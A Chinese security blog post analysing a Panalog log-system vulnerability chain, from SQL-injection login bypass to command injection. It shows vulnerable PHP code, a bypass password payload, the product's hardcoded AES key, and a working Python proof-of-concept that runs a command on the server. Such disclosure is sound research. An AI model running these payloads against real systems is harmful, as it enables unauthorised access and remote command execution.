---
title: 浅析Panalog-SQL注入到命令执行(Version<20240130)
url: https://y4tacker.github.io/2024/06/05/year/2024/6/%E6%B5%85%E6%9E%90Panalog-SQL%E6%B3%A8%E5%85%A5%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Version-20240130/
source: Y4tacker:Hacking The World!
date: 2024-06-06
fetch_date: 2025-10-06T16:55:49.778588
---

# 浅析Panalog-SQL注入到命令执行(Version<20240130)

* [Home](/)
* [Writing](/archives/)
* [Topics](/tags/)
* [Search](/search/)
* [About](/about/)
* [Friends](/link/)

Previous post Next post Back to top Share post

1. [1. 浅析Panalog-SQL注入到命令执行(Version<20240130)](#%E6%B5%85%E6%9E%90Panalog-SQL%E6%B3%A8%E5%85%A5%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Version-lt-20240130)
   1. [1.1. SQL注入](#SQL%E6%B3%A8%E5%85%A5)
      1. [1.1.1. SQL注入点分析](#SQL%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%86%E6%9E%90)
      2. [1.1.2. 题外话](#%E9%A2%98%E5%A4%96%E8%AF%9D)
   2. [1.2. 命令注入](#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5)
   3. [1.3. POC 验证](#POC-%E9%AA%8C%E8%AF%81)

# 浅析Panalog-SQL注入到命令执行(Version<20240130)

Y4tacker

2024-06-05 (Updated: 2025-09-02)

[Panalog](/categories/Panalog/)

[PHP](/tags/PHP/)

# 浅析Panalog-SQL注入到命令执行(Version<20240130)

## SQL注入

### SQL注入点分析

由于此系统代码很简单也没有用第三方的框架，因此我们直接看即可，由于这是利用的第一步所以我们只需要寻找前台功能即可

由于文件太多我们需要进一步缩小范围，通过文件的阅读对于前台SQL功能，我们可以初步筛选出几个条件:

1. 不存在chksession函数(判断是否登录)
2. 页面内容存在mysql
3. 存在GET/POST可控参数

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 ``` | ``` folder_path = ''  for root, dirs, files in os.walk(folder_path):     for file in files:         if file.endswith(".php"):             file_path = os.path.join(root, file)             with open(file_path, 'rb') as f:                 content = f.read()                 if b"chksession" not in content and b"mysql" in content and (b"$_GET" in content or b"$_POST" in content):                     print(file_path.replace(folder_path, '')) ``` |

之后经过简单的代码阅读发现，前台查询可控功能点仅在login.php当中

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` ------输出结果------ /login.php /ajax_report.php(SQL执行参数不可控) /Maintain/bdmap.php(SQL执行参数不可控) /Maintain/getdevsc.php(SQL执行参数不可控) ``` |

为方便大家理解，在这里仅仅贴出关键函数执行部分，可以看到这些是对参数中部分字符做移除处理，之后如果不使用ldap作为登录判断校验，对参数做解密

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 ``` | ``` $username = postval("user"); $password = postval("mypass"); $sec = postval("sec"); $useldap = postval("useldap"); $username = str_replace("\'", "", $username); $username = str_replace("=", "", $username); $username = str_replace(" ", "", $username); $password = str_replace("\'", "", $password);  /** 对username和password进行解密 */ if (!$useldap) { 	exec("/usr/logd/bin/enctool -d '$username'", $out, $ret); 	$username = $out[0]; 	unset($out); 	exec("/usr/logd/bin/enctool -d '$password'", $out, $ret); 	$password = $out[0]; }  xxxxxxx $username = mysql_real_escape_string($username); function gettimes($user) { 	$t = time(); 	$max_logintimes = 0; 	$logintimes = 0; 	$logintime = 0; 	$max_locktime = 0; 	$sql = "select logintimes, max_logintimes, logintime, max_locktime from palog.users where username='$user'"; 	if (($result = mysql_query($sql)) != false) { 		while ($row = mysql_fetch_row($result)) { 			$logintimes = $row[0]; 			$max_logintimes = $row[1]; 			$logintime = $row[2]; 			$max_locktime = $row[3]; 		} 	}  	if ($max_locktime == 0 && 	    $max_logintimes == 0 &&  	    $logintime == 0 &&  	    $logintimes == 0) 	    return false;  	$json = array("logintimes"=>$logintimes, "max_logintimes"=>$max_logintimes, "logintime"=>$logintime, "max_locktime"=>$max_locktime); 	return json_encode($json);  } xxxxxxx // 检查是否锁住账号 if (($json = gettimes($username)) == false) { 	outputres("no", "invalid user"); 	mysql_close(); 	exit; } xxxxxxx if ($useldap) { xxxxxxx } else { 	$sql = 'SELECT * from palog.users where username = "'.$username.'" and binary password="'.$password.'"'; 	if (($result = mysql_query($sql)) == false) { 		loginfail($username); 		outputres("no", mysql_error()); 		mysql_close(); 		exit;  	} 	if (($num = mysql_num_rows($result)) == 0) { 		if (checkpassfrom_soap($username, $password) == false) { 			loginfail($username); 			outputres("no", "用户不存在或密码错误"); 			mysql_close(); 			exit; 		}  		$_SESSION["palog_usertype"] = "hangxin"; 	} } ``` |

可以看到这里对username参数限制比较严格，但是对password参数仅仅只是为了防止命令执行参数逃逸移除了`'`，在这时候我们就很容易想到通过万能密码去构造即可让username为`admin`（这里username一定要是系统中已经存在的某个用户，程序里面在注入点前通过username判断了是否为有效用户）,之后让password为`"1 or 1=1 limit 1#`即可

### 题外话

在这里可能大家(其实只有我)会比较好奇这个加密是什么

这里有两种方式，一种是第一反应直接使用IDA看看程序逻辑，另一种则是去看看登录过程在前端或者后端哪个位置做了加密，此时我们便很容易通过代码推测

首先简单用IDA看看入口函数

![image-20240605210530687](/2024/06/05/year/2024/6/%E6%B5%85%E6%9E%90Panalog-SQL%E6%B3%A8%E5%85%A5%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Version-20240130/image-20240605210530687.png)

继续看sub\_400F45，根据参数e或d决定加密解密

![image-20240605210440613](/2024/06/05/year/2024/6/%E6%B5%85%E6%9E%90Panalog-SQL%E6%B3%A8%E5%85%A5%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Version-20240130/image-20240605210440613.png)

解密逻辑中很显然能发现是通过AES解密，当然其实这并不适合我们Web狗，做不擅长的东西会浪费大量时间

![image-20240605210611944](/2024/06/05/year/2024/6/%E6%B5%85%E6%9E%90Panalog-SQL%E6%B3%A8%E5%85%A5%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Version-20240130/image-20240605210611944.png)

一般来说我们会选择第二种方式，既然后端接收到的是加密参数，那么前端或者后端一定有对应的加密函数，经过一番简单的寻找，发现html代码中很容易找到这个加密函数

![image-20240605210903286](/2024/06/05/year/2024/6/%E6%B5%85%E6%9E%90Panalog-SQL%E6%B3%A8%E5%85%A5%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Version-20240130/image-20240605210903286.png)

继续分析具体逻辑发现，JS加密了

![image-20240605211004559](/2024/06/05/year/2024/6/%E6%B5%85%E6%9E%90Panalog-SQL%E6%B3%A8%E5%85%A5%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Version-20240130/image-20240605211004559.png)

当然这种时候我们就可以通过动态调试慢慢恢复具体逻辑，这里我简单列一下就不写具体动态调试过程了

此时我们不难发现使用的是AES/ECB/ZeroPadding模式，key为1pan2w0x3edclrf0，简单做个验证

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 ``` | ``` function log_aes_encrypt(enc_str) {      return CryptoJS['AES']['encrypt'](enc_str, CryptoJS['enc']['Utf8']['parse']("1pan2w0x3edclrf0"), {         'mode': CryptoJS['mode']['ECB'],         'padding': CryptoJS['pad']['ZeroPadding']     })['toString'](); } ``` |

简单做个验证，不追求细节了懒得继续调试

![image-20240605211357191](/2024/06/05/year/2024/6/%E6%B5%85%E6%9E%90Panalog-SQL%E6%B3%A8%E5%85%A5%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Version-20240130/image-20240605211357191.png)

## 命令注入

命令注入的点非常好寻找，这里简单谈谈即可，在`/App/app_handle.php`中，不难发现这里面全都是是拼接注入的代码

在这里找个最简单的只有一个参数的功能点做验证

![image-20240605212458618](/2024/06/05/year/2024/6/%E6%B5%85%E6%9E%90Panalog-SQL%E6%B3%A8%E5%85%A5%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Version-20240130/image-20240605212458618.png)

## POC 验证

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ``` | ``` import requests pre_url = "https://xxxx" url = pre_url + "/login.php" app_handle_url = pre_url + "/App/app_handle.php" sess = requests.Session() data = {     "user": "05110f8b023d9f2ca362d32a4e371923",     "mypass": "25aad7cd2ae730a9bfd2bceed7b87e6d8eaf6d5718b5ac7df5aeba3f562dc06c",     "useldap": 0 } headers = {     "PHPSESSID": "y4tacker" } r = sess.post(url, data=data, headers=headers, verify=False) rce = {     "type": "if_trend",     "hours": "';`id > /usr/logd/www/js/yyds2.js`;'" } r2 = sess.post(app_handle_url, data=rce, verify=False, headers=headers) print(sess.get(pre_url+"/js/yyds2.js", verify=False, headers=headers).text) ``` |

Please enable JavaScript to view the comments.

* [Home](/)
* [Writing](/archives/)
* [Topics](/tags/)
* [Search](/search/)
* [About](/about/)
* [Friends](/link/)

1. [1. 浅析Panalog-SQL注入到命令执行(Version<20240130)](#%E6%B5%85%E6%9E%90Panalog-SQL%E6%B3%A8%E5%85%A5%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Version-lt-20240130)
   1. [1.1. SQL注入](#SQL%E6%B3%A8%E5%85%A5)
      1. [1.1.1. SQL注入点分析](#SQL%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%86%E6%9E%90)
      2. [1.1.2. 题外话](#%E9%A2%98%E5%A4%96%E8%AF%9D)
   2. [1.2. 命令注入](#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5)
   3. [1.3. POC 验证](#POC-%E9%AA%8C%E8%AF%81)

Menu TOC Share Top

Copyright © 2016-2025 Y4tacker

* [Home](/)
* [Writing](/archives/)
* [Topics](/tags/)
* [Search](/search/)
* [About](/about/)
* [Friends](/link/)

本站总访问量次 | 本站访客数人